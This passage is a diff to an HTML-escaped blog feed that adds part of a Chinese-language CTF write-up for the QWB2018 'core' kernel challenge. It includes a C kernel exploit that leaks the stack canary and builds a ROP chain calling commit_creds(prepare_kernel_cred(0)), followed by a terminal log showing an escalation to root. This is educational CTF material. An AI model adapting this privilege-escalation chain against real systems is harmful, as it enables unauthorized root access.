+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;ssize_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vmlinux_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;raw_vmlinux_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+	&lt;span class=&#34;n&#34;&gt;set_off&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;core_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[+]canary: %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+	&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff81000b2f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// pop rdi; ret
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;// prepare_kernel_cred(0)
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff810a0f49&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// pop rdx; ret
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff81021e53&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// pop rcx; ret
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff8101aa6a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// mov rdi, rax; call rdx; 
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff81a012da&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// swapgs; popfq; ret
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff81050ac2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// iretq; ret; 
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spawn_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;// rip 
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_cs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_rflags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_ss&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+	&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x800&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;core_copy_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffffffff0000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+
+	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id=&#34;get-root-shell-1&#34;&gt;get root shell&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;QWB2018_core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; gcc exploit.c -static -masm&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intel -g -o exploit // 如果使用 intel 汇编需要加上 -masm&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intel 
+QWB2018_core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; cp exploit give_to_player/core/tmp
+cp：是否覆盖&lt;span class=&#34;s1&#34;&gt;&amp;#39;give_to_player/core/tmp/exploit&amp;#39;&lt;/span&gt;？ y
+QWB2018_core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; give_to_player/core
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ./gen_cpio.sh core.cpio
+.
+./usr
+./usr/sbin
+......
+......
+
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mv core.cpio ..
+mv：是否覆盖&lt;span class=&#34;s1&#34;&gt;&amp;#39;../core.cpio&amp;#39;&lt;/span&gt;？ y
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ./start.sh
+
+/ $ ls /tmp/
+exploit   kallsyms
+/ $ id
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;chal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;chal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;chal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/ $ /tmp/exploit
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;status has been saved.
+commit_creds addr: 0xffffffffbd09c8e0
+vmlinux_base addr: 0xffffffffbd000000
+prepare_kernel_cred addr: 0xffffffffbd09cce0
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; off to &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; to buf.
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;canary: 0x6be486f377bb8600
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;copy from user with size: -65280
+/ &lt;span class=&#34;c1&#34;&gt;# id
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;当然这个题目也有其他做法，下篇再分析。&lt;/p&gt;
+
 &lt;h2 id=&#34;reference-and-thanks-to&#34;&gt;Reference and Thanks to&lt;/h2&gt;
 
 &lt;p&gt;Linux Manual Pages&lt;/p&gt;
@@ -1034,7 +2517,13 @@ exploit
 
 &lt;p&gt;&lt;a href=&#34;http://muhe.live/2017/07/13/babydriver-writeup/&#34;&gt;http://muhe.live/2017/07/13/babydriver-writeup/&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2306&#34;&gt;https://xz.aliyun.com/t/2306&lt;/a&gt;&lt;/p&gt;</description>
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2306&#34;&gt;https://xz.aliyun.com/t/2306&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml&#34;&gt;https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/gatieme/article/details/78311841&#34;&gt;https://blog.csdn.net/gatieme/article/details/78311841&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://veritas501.space/2018/06/05/qwb2018%20core/&#34;&gt;https://veritas501.space/2018/06/05/qwb2018%20core/&lt;/a&gt;&lt;/p&gt;</description>
       
     </item>
     
